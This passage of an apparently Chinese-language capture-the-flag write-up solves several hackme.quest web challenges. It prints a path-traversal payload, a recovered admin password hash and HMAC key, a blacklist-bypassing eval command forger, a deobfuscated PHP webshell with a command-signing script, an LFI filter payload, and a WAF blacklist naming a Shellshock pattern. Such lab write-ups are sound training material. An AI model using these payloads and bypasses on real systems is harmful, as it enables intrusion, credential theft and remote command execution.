\u0026#34;delete\u0026#34;: 18 require \u0026#34;./core/fun_del.php\u0026#34;; 19 del_items($GLOBALS[\u0026#34;dir\u0026#34;]); 20 break; 21 // COPY/MOVE FILE(S)/DIR(S) 22 23 case \u0026#34;copy\u0026#34;: 24 case \u0026#34;move\u0026#34;: 25 require \u0026#34;./core/fun_copy_move.php\u0026#34;; 26 copy_move_items($GLOBALS[\u0026#34;dir\u0026#34;]); 27 break; 28 // DOWNLOAD FILE 29 30 case \u0026#34;download\u0026#34;: 31 ob_start(); // prevent unwanted output 32 require \u0026#34;./core/fun_down.php\u0026#34;; 33 ob_end_clean(); // get rid of cached unwanted output 34 download_item($GLOBALS[\u0026#34;dir\u0026#34;], $GLOBALS[\u0026#34;item\u0026#34;]); 35 ob_start(false); // prevent unwanted output 36 exit; 37 break; 38 // UPLOAD FILE(S) 39 40 case \u0026#34;upload\u0026#34;: 41 require \u0026#34;./core/fun_up.php\u0026#34;; 42 upload_items($GLOBALS[\u0026#34;dir\u0026#34;]); 43 break; 44 // CREATE DIR/FILE 45 46 case \u0026#34;mkitem\u0026#34;: 47 require \u0026#34;./core/fun_mkitem.php\u0026#34;; 48 make_item($GLOBALS[\u0026#34;dir\u0026#34;]); 49 break; 50 // CHMOD FILE/DIR 51 52 case \u0026#34;chmod\u0026#34;: 53 require \u0026#34;./core/fun_chmod.php\u0026#34;; 54 chmod_item($GLOBALS[\u0026#34;dir\u0026#34;], $GLOBALS[\u0026#34;item\u0026#34;]); 55 break; 56 // SEARCH FOR FILE(S)/DIR(S) 57 58 case \u0026#34;search\u0026#34;: 59 require \u0026#34;./core/fun_search.php\u0026#34;; 60 search_items($GLOBALS[\u0026#34;dir\u0026#34;]); 61 break; 62 // CREATE ARCHIVE 63 64 case \u0026#34;arch\u0026#34;: 65 require \u0026#34;./core/fun_archive.php\u0026#34;; 66 archive_items($GLOBALS[\u0026#34;dir\u0026#34;]); 67 break; 68 // USER-ADMINISTRATION 69 70 case \u0026#34;admin\u0026#34;: 71 require \u0026#34;./core/fun_admin.php\u0026#34;; 72 show_admin($GLOBALS[\u0026#34;dir\u0026#34;]); 73 break; 74 case \u0026#34;debug\u0026#34;: 75 require \u0026#34;./core/fun_debug.php\u0026#34;; 76 do_debug($GLOBALS[\u0026#34;dir\u0026#34;]); 77 break; 78 // DEFAULT: LIST FILES \u0026amp; DIRS 79 80 case \u0026#34;list\u0026#34;: 81 default: 82 require \u0026#34;./core/fun_list.php\u0026#34;; 83 list_dir($GLOBALS[\u0026#34;dir\u0026#34;]); 84} // end switch-statement 85show_footer(); 可以看到有許多action可以做。\n其中有些功能就放在界面上方：\n例如「搜尋」功能，點擊後可以看到網址顯示「https://dafuq-manager.hackme.quest/index.php?action=search\u0026amp;order=name\u0026amp;srt=yes\u0026amp;lang=cht」，action就直接使用GET傳遞即可，其他參數也是。\n我們的目標是管理員的帳號密碼，我們可以從下載下來的檔案中發現，guest的密碼被存放在.config/.htusers.php中：\n只要有辦法讀取該檔案，應該就可以看到管理員的密碼。\n上面的action中有一個edit功能可以編輯檔案，而該功能要輸入兩個參數，分別是欲編輯檔案的路徑dir以及檔名item。\n直接嘗試：action=edit\u0026amp;dir=.config/\u0026amp;item=.htusers.php，顯示錯誤：\n根目錄似乎在是在/var/www/webhdisk/。\n輸入絕對路徑試試：action=edit\u0026amp;dir=/var/www/webhdisk/.config/\u0026amp;item=.htusers.php：\n好吧看來根目錄不是這樣，嘗試使用相對路徑。\n嘗試許多次，還是顯示檔案不存在：\n看起來dir是受到過濾的，但item似乎\u0026hellip;\n不在dir指定路徑，而是改從item來繞過。\n嘗試不傳送dir，只傳送item。\n嘗試幾次之後，找到item輸入/../.config/.htusers.php可以繞過。\naction=edit\u0026amp;item=/../.config/.htusers.php：\n成功讀取檔案內容，管理者帳號為「adm1n15trat0r」，MD5 雜湊的密碼為「34af0d074b17f44d1bb939765b02776f」。\n雖然雜湊理論上是無法被反解的，但若是該雜湊原文有被刻意的紀錄過，那麼就可以得知原文。\n直接將這段雜湊放上網搜尋「MD5 Decode」，就可以得到原文為「how do you turn this on」。\n帳號「adm1n15trat0r」，密碼「how do you turn this on」，登入：\n打開.flag-2_（´・ω・｀）.txt就可以得到 Flag FLAG{how do you turn this on?}\n33. dafuq-manager 3 # Get a shell to find flag 3\n繼續上一題，點開檔案.where-is-flag-3-do-you-know-that.txt，會看到以下訊息：\nFor flag3, you need a shell to get that. see $WEBROOT/flag3! 這題應該就是要拿到 shell，然後去根目錄下讀取「flag3」這個檔案。\n繼續 view code 可以在core/fun_debug.php這個檔案中看到如下內容：\n1\u0026lt;?php 2function make_command($cmd) { 3 $hmac = hash_hmac(\u0026#39;sha256\u0026#39;, $cmd, $GLOBALS[\u0026#34;secret_key\u0026#34;]); 4 return sprintf(\u0026#39;%s.%s\u0026#39;, base64_encode($cmd), $hmac); 5} 6function do_debug() { 7 assert(strlen($GLOBALS[\u0026#39;secret_key\u0026#39;]) \u0026gt; 40); 8 $dir = $GLOBALS[\u0026#39;__GET\u0026#39;][\u0026#39;dir\u0026#39;]; 9 if (strcmp($dir, \u0026#34;magically\u0026#34;) || strcmp($dir, \u0026#34;hacker\u0026#34;) || strcmp($dir, \u0026#34;admin\u0026#34;)) { 10 show_error(\u0026#39;You are not hacky enough :(\u0026#39;); 11 } 12 list($cmd, $hmac) = explode(\u0026#39;.\u0026#39;, $GLOBALS[\u0026#39;__GET\u0026#39;][\u0026#39;command\u0026#39;], 2); 13 $cmd = base64_decode($cmd); 14 $bad_things = array(\u0026#39;system\u0026#39;, \u0026#39;exec\u0026#39;, \u0026#39;popen\u0026#39;, \u0026#39;pcntl_exec\u0026#39;, \u0026#39;proc_open\u0026#39;, \u0026#39;passthru\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;eval\u0026#39;, \u0026#39;assert\u0026#39;, \u0026#39;preg_replace\u0026#39;, \u0026#39;create_function\u0026#39;, \u0026#39;include\u0026#39;, \u0026#39;require\u0026#39;, \u0026#39;curl\u0026#39;,); 15 foreach ($bad_things as $bad) { 16 if (stristr($cmd, $bad)) { 17 die(\u0026#39;2bad\u0026#39;); 18 } 19 } 20 if (hash_equals(hash_hmac(\u0026#39;sha256\u0026#39;, $cmd, $GLOBALS[\u0026#34;secret_key\u0026#34;]), $hmac)) { 21 die(eval($cmd)); 22 } else { 23 show_error(\u0026#39;What does the fox say?\u0026#39;); 24 } 25} make_command() 將輸入的指令經過 hmac 之後，連同指令本身的 base64 編碼一起輸出。 do_debug() 會去抓取「$GLOBALS['__GET']['command']」之後，經過黑名單$bad_things過濾敏感指令，並且將其拆分成hmac及base64兩段，然後判斷是否配對。 我們可以在.config/conf.php中找到密鑰：$GLOBALS[\u0026quot;secret_key\u0026quot;] = 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3'\n這麼一來，理論上我們只需要將要觸發的指令用該密鑰進行hmac運算後再塞給 server 就行了。\n但有個問題，剛剛看到黑名單檔掉了許多像是system、exec、eval、curl等可以讓系統執行指令的 function，要怎麼繞過？\n其實也不難，只要不要讓單字同時出現即可，可以利用 PHP 的特性。\n把「system」拆成「sys」及「tem」：$c1=\u0026quot;sys\u0026quot;;$c2=\u0026quot;tem\u0026quot;;($c1.$c2)() = system()\n寫個 PHP 來幫助我們包裝指令：\n1\u0026lt;?php 2$cmd = \u0026#34;ls -al\u0026#34;; 3 4function make_command($cmd) { 5 $secret_key = \u0026#34;KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3\u0026#34;; 6 $cmd = \u0026#39;$c1=\u0026#34;sys\u0026#34;;$c2=\u0026#34;tem\u0026#34;;($c1.$c2)(\u0026#34;\u0026#39;.$cmd.\u0026#39;\u0026#34;);\u0026#39;; 7 $hmac = hash_hmac(\u0026#39;sha256\u0026#39;, $cmd, $secret_key); 8 return sprintf(\u0026#39;%s.%s\u0026#39;, base64_encode($cmd), $hmac); 9} 10 11echo $cmd.\u0026#39;\u0026lt;br\u0026gt;\u0026#39;; 12echo make_command($cmd); 「JGMxPSJzeXMiOyRjMj0idGVtIjsoJGMxLiRjMikoImxzIC1hbCIpOw==.df0bfdb55e82b6491b44ef33590e78add28dd90a3f52b616a20363d10ecd9f32」就是要餵給do_debug()的值了。\n在index.php當中有一段這麼寫：\n1switch ($GLOBALS[\u0026#34;action\u0026#34;]) { 2. 3. 4. 5 case \u0026#34;debug\u0026#34;: 6 require \u0026#34;./core/fun_debug.php\u0026#34;; 7 do_debug($GLOBALS[\u0026#34;dir\u0026#34;]); 8 break; 9. 10. 11. 而剛剛有看到dir該參數必須繞過「strcmp($dir, \u0026quot;magically\u0026quot;) || strcmp($dir, \u0026quot;hacker\u0026quot;) || strcmp($dir, \u0026quot;admin\u0026quot;)」判斷。\n但似乎它並沒有被嚴格過濾，所以可以傳陣列格式的dir讓strcmp()錯誤，即可失效。\n所以整個 payload 大概長這樣：\naction=debug\u0026amp;dir[]\u0026amp;command=JGMxPSJzeXMiOyRjMj0idGVtIjsoJGMxLiRjMikoImxzIC1hbCIpOw==.df0bfdb55e82b6491b44ef33590e78add28dd90a3f52b616a20363d10ecd9f32 執行之後就可以看到畫面顯示：\nUm\u0026hellip; 有點亂，整理一下：\n1total 44 2drwxr-xr-x 10 1000 1000 4096 Nov 16 2017 . 3drwxr-xr-x 4 root root 4096 Jan 8 09:19 .. 4drwxr-xr-x 2 1000 1000 4096 Nov 16 2017 .config 5drwxr-xr-x 2 1000 1000 4096 Oct 4 2016 core 6drwxr-xr-x 4 1000 1000 4096 Oct 4 2016 data 7drwxr-xr-x 2 1000 1000 4096 Oct 4 2016 flag3 8drwxr-xr-x 2 1000 1000 4096 Oct 4 2016 img 9-rw-r--r-- 1 1000 1000 2233 Oct 4 2016 index.php 10drwxr-xr-x 2 1000 1000 4096 Oct 4 2016 lang 11drwxr-xr-x 2 1000 1000 4096 Oct 4 2016 lib 12drwxr-xr-x 2 1000 1000 4096 Oct 4 2016 style 原來flag3是個目錄，那麼先看看裡面有什麼東西。\n用一樣的方式執行ls -al flag3：\nJGMxPSJzeXMiOyRjMj0idGVtIjsoJGMxLiRjMikoImxzIC1hbCBmbGFnMyIpOw==.86155156aee864578f4c7aec84c9a6e11c417b7aa350b845340bf6ec08238cb9 輸出：\ntotal 32 drwxr-xr-x 2 1000 1000 4096 Oct 4 2016 . drwxr-xr-x 10 1000 1000 4096 Nov 16 2017 .. -rw-r--r-- 1 1000 1000 161 Oct 4 2016 Makefile -r-------- 1 1000 1000 72 Oct 4 2016 flag3 -rwx--x--x 1 1000 1000 9232 Oct 4 2016 meow -rw-r--r-- 1 1000 1000 783 Oct 4 2016 meow.c Makefile 裡面長這樣：\n1all: 2 gcc meow.c -o meow 3 sudo chown flag3:flag3 meow 4 sudo chmod 111 meow 5 sudo chmod +s meow 6 sudo chown flag3:flag3 flag3 7 sudo chmod 400 flag3 8 ./meow flag3 flag3似乎因為權限問題，無法被直接讀取。\n先看看meow.c是什麼，執行「cat ./flag3/meow.c」：\nJGMxPSJzeXMiOyRjMj0idGVtIjsoJGMxLiRjMikoImNhdCAuL2ZsYWczL21lb3cuYyIpOw==.76282a859b8e5aa80039b069441b1cc450c57b77e250410cad889b3afdc1c101 得到原始碼：\n1#include \u0026lt;stdio.h\u0026gt; 2#include \u0026lt;sys stat.h\u0026gt; 3#include \u0026lt;sys types.h\u0026gt; 4#include \u0026lt;unistd.h\u0026gt; 5#include \u0026lt;fcntl.h\u0026gt; 6 7int main(int argc, char *argv[]) 8{ 9 const char *exec = argv[0]; 10 const char *flag = argv[1]; 11 char buffer[4096]; 12 13 if(argc \u0026lt; 2) { 14 printf(\u0026#34;Usage: %s flag\\n\u0026#34;, argv[0]); 15 puts(\u0026#34;We have cat to read file, And the meow to cat flag.\u0026#34;); 16 return 0; 17 } 18 19 struct stat S; 20 if(stat(exec, \u0026amp;S) != 0) { 21 printf(\u0026#34;Can not stat file %s\\n\u0026#34;, exec); 22 return 1; 23 } 24 25 uid_t uid = S.st_uid; 26 gid_t gid = S.st_gid; 27 28 setuid(uid); 29 seteuid(uid); 30 setgid(gid); 31 setegid(gid); 32 33 int fd = open(flag, O_RDONLY); 34 if(fd == -1) { 35 printf(\u0026#34;Can not open file %s\\n\u0026#34;, flag); 36 return 2; 37 } 38 ssize_t readed = read(fd, buffer, sizeof(buffer) - 1); 39 if(readed \u0026gt; 0) { 40 write(1, buffer, readed); 41 } 42 close(fd); 43} 看起來可以透過meow來讀取flag3，由於怕執行路徑會影響，所以先進入程式目錄下再執行它。\n執行cd ./flag3; ./meow flag3：\nJGMxPSJzeXMiOyRjMj0idGVtIjsoJGMxLiRjMikoImNkIC4vZmxhZzM7IC4vbWVvdyBmbGFnMyIpOw==.7a6a92f9480943230008e349105276dc1536a5c2f499b92c395d5360d37760a3 Flag FLAG{Oh, Looks like you have a shell. Please don't fuck up the system.}\n34. wordpress 1 # Something strange is hidding in the source code, find it.\nTips: This challenge does not require to exploit any thing, don’t use any scanner.\n題目似乎爛掉的樣子，先放著，之後有修再來解。\n35. wordpress 2 # Find another strange thing in the source code.\nTips: This challenge does not require to exploit any thing, don’t use any scanner.\n題目爛掉。\n36. webshell # You have my webshell, find the flag!\n這題一打開是空白畫面，按照慣例先看看原始碼。\n看來這是當前頁面的 PHP 了。\n1$cation = \u0026#34;St\\x72\\x5fr\\x4ft\\x313\u0026#34;; 2$e_obfus=\u0026#34;b\\x41Se\\x364\\x5f\\x44e\\x43ode\u0026#34;; 3$e_cod = \u0026#34;g\\x5ainfl\\x41t\\x45\u0026#34; ; $sourc = 4\u0026#34;St\\x72\\x72\\x45v\u0026#34;; @eval ($sourc($e_cod( 5$e_obfus($cation(\u0026#34;KMSqn8VjTVKi9lgrcMtH3V 6qwT8jvb2vzjiltmKowKNt12dQTxxEDMC99voecmS 7H4rKBrpkXVDwmC1yBbi0PV1IeQA0GuTWSr3Pqi3I 8qTu92xznWEDw4FxeVNv4JpGewDovk8re57tTcMsM 9nk5nVDzzyefSIFS7PQb7AnFMfcg3UBjvl4H/GnPx 10/leZxlP/OFJYZ1cqYiHEDvWszvhYHoLnRhvv29gx 11cLgJbveVKw5k4jEwAc0VvFAtiPzpZ6BwDnQKOltX 12sF+JmSCVPdu0NI3qpr406XpZnKBpfAm+Rjhd9Z00 13TUQFagaWJg8qmNQowQCzaUmVaiSlCBLL+VkfuOYe 14A8+LkWdkHmDtp9xcmqB6H5OgyaqXK+gpWJTPBuHi 15STW8OO9t13k2/7r+He8BfU\u0026#34;))))); 看來經過編碼，先把它回推再說。\n先把hex的部份轉換一下，然後稍微排版：\n1$cation = \u0026#34;Str_r0t13\u0026#34;; 2$e_obfus = \u0026#34;bASe64_DeCode\u0026#34;; 3$e_cod = \u0026#34;gZinflAtE\u0026#34;; 4$sourc = \u0026#34;StrrEv\u0026#34;; 5 6@eval($sourc($e_cod( 7$e_obfus($cation(\u0026#34;KMSqn8VjTVKi9lgrcMtH3V 8qwT8jvb2vzjiltmKowKNt12dQTxxEDMC99voecmS 9H4rKBrpkXVDwmC1yBbi0PV1IeQA0GuTWSr3Pqi3I 10qTu92xznWEDw4FxeVNv4JpGewDovk8re57tTcMsM 11nk5nVDzzyefSIFS7PQb7AnFMfcg3UBjvl4H/GnPx 12/leZxlP/OFJYZ1cqYiHEDvWszvhYHoLnRhvv29gx 13cLgJbveVKw5k4jEwAc0VvFAtiPzpZ6BwDnQKOltX 14sF+JmSCVPdu0NI3qpr406XpZnKBpfAm+Rjhd9Z00 15TUQFagaWJg8qmNQowQCzaUmVaiSlCBLL+VkfuOYe 16A8+LkWdkHmDtp9xcmqB6H5OgyaqXK+gpWJTPBuHi 17STW8OO9t13k2/7r+He8BfU\u0026#34;))))); 所以可以理解成\n1@eval(strrev(gzinflate(base64_decode(str_rot13(\u0026#34;KMSqn8VjTVKi9lgrcMtH3V 2qwT8jvb2vzjiltmKowKNt12dQTxxEDMC99voecmS 3H4rKBrpkXVDwmC1yBbi0PV1IeQA0GuTWSr3Pqi3I 4qTu92xznWEDw4FxeVNv4JpGewDovk8re57tTcMsM 5nk5nVDzzyefSIFS7PQb7AnFMfcg3UBjvl4H/GnPx 6/leZxlP/OFJYZ1cqYiHEDvWszvhYHoLnRhvv29gx 7cLgJbveVKw5k4jEwAc0VvFAtiPzpZ6BwDnQKOltX 8sF+JmSCVPdu0NI3qpr406XpZnKBpfAm+Rjhd9Z00 9TUQFagaWJg8qmNQowQCzaUmVaiSlCBLL+VkfuOYe 10A8+LkWdkHmDtp9xcmqB6H5OgyaqXK+gpWJTPBuHi 11STW8OO9t13k2/7r+He8BfU\u0026#34;))))); str_rot13()：Perform the rot13 transform on a string base64_decode()：Decodes data encoded with MIME base64 gzinflate()：Inflate a deflated string strrev()：Reverse a string eval()：Evaluate a string as PHP code (好拉其實你只要把 eval 改成 echo 就可以輸出原始碼)\nDecode：\n1function run() { 2 if(isset($_GET[\u0026#39;cmd\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;sig\u0026#39;])) { 3 $cmd = hash(\u0026#39;SHA512\u0026#39;, $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]) ^ (string)$_GET[\u0026#39;cmd\u0026#39;]; 4 $key = $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;] . sha1($_SERVER[\u0026#39;HTTP_HOST\u0026#39;]); 5 $sig = hash_hmac(\u0026#39;SHA512\u0026#39;, $cmd, $key); 6 if($sig === (string)$_GET[\u0026#39;sig\u0026#39;]) { 7 header(\u0026#39;Content-Type: text/plain\u0026#39;); 8 return !!system($cmd); 9 } 10 } 11 return false; 12} 13 14function fuck() { 15 print(str_repeat(\u0026#34;\\n\u0026#34;, 4096)); 16 readfile($_SERVER[\u0026#39;SCRIPT_FILENAME\u0026#39;]); 17} 18 19run() ?: fuck(); 這支程式的流程很簡單，主要是傳入兩個GET，分別是代表要執行的指令cmd以及該指令的簽章sig。\n但這個cmd並不是直接被執行，而是拿去跟經過sha512雜湊後的$_SERVER['REMOTE_ADDR']做XOR運算。($_SERVER['REMOTE_ADDR']就是自己的IP)\n而cmd的簽章是經過hmac(sha512)運算，使用的key則是由$_SERVER['HTTP_USER_AGENT']接著sha1($_SERVER['HTTP_HOST'])組成，意思是http user agent接著domain。\n比對完簽章正確後，就會執行該命令，但執行的是經過XOR運算後的命令。\n所以這題目的很明顯，就是要你讓傳入的cmd字串經過XOR運算後，變成要執行的指令。\n我們需要先將我們要執行的命令與hash('SHA512', $_SERVER['REMOTE_ADDR'])經過XOR運算回去，再把結果作為cmd傳入，讓伺服器運算回指令。\n寫個腳本幫助使用吧(把$ip變數改成自己的公開ip)：\n1\u0026lt;?php 2$cmd = \u0026#39;ls\u0026#39;; 3 4$domain = \u0026#39;webshell.hackme.quest\u0026#39;; 5$ip = \u0026#39;You-Public-Ip\u0026#39;; 6 7$key = $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;] . sha1($domain); 8$_GET[\u0026#39;cmd\u0026#39;] = hash(\u0026#39;SHA512\u0026#39;, $ip) ^ $cmd; 9$_GET[\u0026#39;sig\u0026#39;] = hash_hmac(\u0026#39;SHA512\u0026#39;, $cmd, $key); 10 11$cmd = urlencode($_GET[\u0026#39;cmd\u0026#39;]); 12$sig = urlencode($_GET[\u0026#39;sig\u0026#39;]); 13echo \u0026#34;https://$domain/?cmd=$cmd\u0026amp;sig=$sig\u0026#34;; 輸出的那段網址就會是payload，訪問之後可以看到如下資訊，看起來有成功執行「ls」。\n既然看到flag這個檔案了，那就直接cat它：\n1\u0026lt;?php 2$cmd = \u0026#39;cat flag\u0026#39;; 3 4$domain = \u0026#39;webshell.hackme.quest\u0026#39;; 5$ip = \u0026#39;You-Public-Ip\u0026#39;; 6 7$key = $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;] . sha1($domain); 8$_GET[\u0026#39;cmd\u0026#39;] = hash(\u0026#39;SHA512\u0026#39;, $ip) ^ $cmd; 9$_GET[\u0026#39;sig\u0026#39;] = hash_hmac(\u0026#39;SHA512\u0026#39;, $cmd, $key); 10 11$cmd = urlencode($_GET[\u0026#39;cmd\u0026#39;]); 12$sig = urlencode($_GET[\u0026#39;sig\u0026#39;]); 13echo \u0026#34;https://$domain/?cmd=$cmd\u0026amp;sig=$sig\u0026#34;; 然後你就被耍了$%^\u0026amp;*\n看看隱藏檔案：\n1\u0026lt;?php 2$cmd = \u0026#39;ls -al\u0026#39;; 3 4$domain = \u0026#39;webshell.hackme.quest\u0026#39;; 5$ip = \u0026#39;You-Public-Ip\u0026#39;; 6 7$key = $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;] . sha1($domain); 8$_GET[\u0026#39;cmd\u0026#39;] = hash(\u0026#39;SHA512\u0026#39;, $ip) ^ $cmd; 9$_GET[\u0026#39;sig\u0026#39;] = hash_hmac(\u0026#39;SHA512\u0026#39;, $cmd, $key); 10 11$cmd = urlencode($_GET[\u0026#39;cmd\u0026#39;]); 12$sig = urlencode($_GET[\u0026#39;sig\u0026#39;]); 13echo \u0026#34;https://$domain/?cmd=$cmd\u0026amp;sig=$sig\u0026#34;; 發現可疑的檔案「.htflag」，cat它：\n1\u0026lt;?php 2$cmd = \u0026#39;cat .htflag\u0026#39;; 3 4$domain = \u0026#39;webshell.hackme.quest\u0026#39;; 5$ip = \u0026#39;You-Public-Ip\u0026#39;; 6 7$key = $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;] . sha1($domain); 8$_GET[\u0026#39;cmd\u0026#39;] = hash(\u0026#39;SHA512\u0026#39;, $ip) ^ $cmd; 9$_GET[\u0026#39;sig\u0026#39;] = hash_hmac(\u0026#39;SHA512\u0026#39;, $cmd, $key); 10 11$cmd = urlencode($_GET[\u0026#39;cmd\u0026#39;]); 12$sig = urlencode($_GET[\u0026#39;sig\u0026#39;]); 13echo \u0026#34;https://$domain/?cmd=$cmd\u0026amp;sig=$sig\u0026#34;; Bingo：\nFlag FLAG{Webshell? I only know sea shell~!}\n37. command-executor # Here\u0026rsquo;s my useless developer assistant website, try to execute your own command!\n可以在上面的「List files」中看到當前目錄底下的檔案：\n嘗試一下後會發現，似乎能用的指令都在這邊了。\n猜測可能是輸入指令後，會嘗試去找有沒有「指令.php」檔案，然後引入。\n既然有引入的動作，那可能就有LFI，用解第17題的技巧來解這題：\nindex.php?func=php://filter/read=convert.base64-encode/resource=index 成功拿到index.php的原始碼：\nPD9waHAKJHBhZ2VzID0gWwogICAgWydtYW4nLCAnTWFuJ10sCiAgICBbJ3VudGFyJywgJ1RhciBUZXN0ZXInXSwKICAgIFsnY21kJywgJ0NtZCBFeGVjJ10sCiAgICBbJ2xzJywgJ0xpc3QgZmlsZXMnXSwKXTsKCmZ1bmN0aW9uIGZ1Y2soJG1zZykgewogICAgaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvcGxhaW4nKTsKICAgIGVjaG8gJG1zZzsKICAgIGV4aXQ7Cn0KCiRibGFja19saXN0ID0gWwogICAgJ1wvZmxhZycsICdcKFwpXHMqXHtccyo6O1xzKlx9OycKXTsKCmZ1bmN0aW9uIHdhZigkYSkgewogICAgZ2xvYmFsICRibGFja19saXN0OwogICAgaWYoaXNfYXJyYXkoJGEpKSB7CiAgICAgICAgZm9yZWFjaCgkYSBhcyAka2V5ID0+ICR2YWwpIHsKICAgICAgICAgICAgd2FmKCRrZXkpOwogICAgICAgICAgICB3YWYoJHZhbCk7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBmb3JlYWNoKCRibGFja19saXN0IGFzICRiKSB7CiAgICAgICAgICAgIGlmKHByZWdfbWF0Y2goIi8kYi8iLCAkYSkgPT09IDEpIHsKICAgICAgICAgICAgICAgIGZ1Y2soIiRiIGRldGVjdGVkISBleGl0IG5vdy4iKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKd2FmKCRfU0VSVkVSKTsKd2FmKCRfR0VUKTsKd2FmKCRfUE9TVCk7CgpmdW5jdGlvbiBleGVjdXRlKCRjbWQsICRzaGVsbD0nYmFzaCcpIHsKICAgIHN5c3RlbShzcHJpbnRmKCclcyAtYyAlcycsICRzaGVsbCwgZXNjYXBlc2hlbGxhcmcoJGNtZCkpKTsKfQoKZm9yZWFjaCgkX1NFUlZFUiBhcyAka2V5ID0+ICR2YWwpIHsKICAgIGlmKHN1YnN0cigka2V5LCAwLCA1KSA9PT0gJ0hUVFBfJykgewogICAgICAgIHB1dGVudigiJGtleT0kdmFsIik7CiAgICB9Cn0KCiRwYWdlID0gJyc7CgppZihpc3NldCgkX0dFVFsnZnVuYyddKSkgewogICAgJHBhZ2UgPSAkX0dFVFsnZnVuYyddOwogICAgaWYoc3Ryc3RyKCRwYWdlLCAnLi4nKSAhPT0gZmFsc2UpIHsKICAgICAgICAkcGFnZSA9ICcnOwogICAgfQp9CgppZigkcGFnZSAmJiBzdHJsZW4oJHBhZ2UpID4gMCkgewogICAgdHJ5IHsKICAgICAgICBpbmNsdWRlKCIkcGFnZS5waHAiKTsKICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgewogICAgfQp9CgpmdW5jdGlvbiByZW5kZXJfZGVmYXVsdCgpIHsgPz4KPHA+V2VsY29tZSB0byB1c2Ugb3VyIGRldmVsb3BlciBhc3Npc3RhbnQgc2VydmljZS4gV2UgcHJvdmlkZSBzZXJ2aWFsIHVzZWxlc3MgZmVhdHVyZXMgdG8gbWFrZSB5b3VyIGRldmVsb3BpbmcgbGlmZSBoYXJkZXIuPC9wPgoKPGltZyBzcmM9IndpbmRvd3MtcnVuLmpwZyIgYWx0PSJjb21tYW5kIGV4ZWN1dG9yIj4KPD9waHAgfQo/PjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CiAgPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8dGl0bGU+Q29tbWFuZCBFeGVjdXRvcjwvdGl0bGU+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImJvb3RzdHJhcC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIG1lZGlhPSJhbGwiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjb21pYy1uZXVlL2ZvbnQuY3NzIiBtZWRpYT0iYWxsIj4KICAgIDxzdHlsZT4KICAgICAgbmF2IHsgbWFyZ2luLWJvdHRvbTogMXJlbTsgfQogICAgICBpbWcgeyBtYXgtd2lkdGg6IDEwMCU7IH0KICAgIDwvc3R5bGU+CiAgPC9oZWFkPgogIDxib2R5PgogICAgPG5hdiBjbGFzcz0ibmF2YmFyIG5hdmJhci1leHBhbmQtbGcgbmF2YmFyLWRhcmsgYmctZGFyayBkLWZsZXgiPgogICAgICA8YSBjbGFzcz0ibmF2YmFyLWJyYW5kIiBocmVmPSJpbmRleC5waHAiPkNvbW1hbmQgRXhlY3V0b3I8L2E+CgogICAgICA8dWwgY2xhc3M9Im5hdmJhci1uYXYiPgo8P3BocCBmb3JlYWNoKCRwYWdlcyBhcyBsaXN0KCRmaWxlLCAkdGl0bGUpKTogPz4KICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iaW5kZXgucGhwP2Z1bmM9PD89JGZpbGU/PiI+PD89JHRpdGxlPz48L2E+CiAgICAgICAgPC9saT4KPD9waHAgZW5kZm9yZWFjaDsgPz4KICAgICAgPC91bD4KICAgIDwvbmF2PgoKICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+PD9waHAgaWYoaXNfY2FsbGFibGUoJ3JlbmRlcicpKSByZW5kZXIoKTsgZWxzZSByZW5kZXJfZGVmYXVsdCgpOyA/PjwvZGl2PgogIDwvYm9keT4KPC9odG1sPgo= Decode\n1\u0026lt;?php 2$pages = [ 3 [\u0026#39;man\u0026#39;, \u0026#39;Man\u0026#39;], 4 [\u0026#39;untar\u0026#39;, \u0026#39;Tar Tester\u0026#39;], 5 [\u0026#39;cmd\u0026#39;, \u0026#39;Cmd Exec\u0026#39;], 6 [\u0026#39;ls\u0026#39;, \u0026#39;List files\u0026#39;], 7]; 8 9function fuck($msg) { 10 header(\u0026#39;Content-Type: text/plain\u0026#39;); 11 echo $msg; 12 exit; 13} 14 15$black_list = [ 16 \u0026#39;\\/flag\u0026#39;, \u0026#39;\\(\\)\\s*\\{\\s*:;\\s*\\};\u0026#39; 17]; 18 19function waf($a) { 20 global $black_list; 21 if(is_array($a)) { 22 foreach($a as $key =\u0026gt; $val) { 23 waf($key); 24 waf($val); 25 } 26 } else { 27 foreach($black_list as $b) { 28 if(preg_match(\u0026#34;/$b/\u0026#34;, $a) === 1) { 29 fuck(\u0026#34;$b detected! exit now.\u0026#34;); 30 } 31 } 32 } 33} 34 35waf($_SERVER); 36waf($_GET); 37waf($_POST); 38 39function execute($cmd, $shell=\u0026#39;bash\u0026#39;) { 40 system(sprintf(\u0026#39;%s -c %s\u0026#39;, $shell, escapeshellarg($cmd))); 41} 42 43foreach($_SERVER as $key =\u0026gt; $val) { 44 if(substr($key, 0, 5) === \u0026#39;HTTP_\u0026#39;) { 45 putenv(\u0026#34;$key=$val\u0026#34;); 46 } 47} 48 49$page = \u0026#39;\u0026#39;; 50 51if(isset($_GET[\u0026#39;func\u0026#39;])) { 52 $page = $_GET[\u0026#39;func\u0026#39;]; 53 if(strstr($page, \u0026#39;..\u0026#39;) !== false) { 54 $page = \u0026#39;\u0026#39;; 55 } 56} 57 58if($page 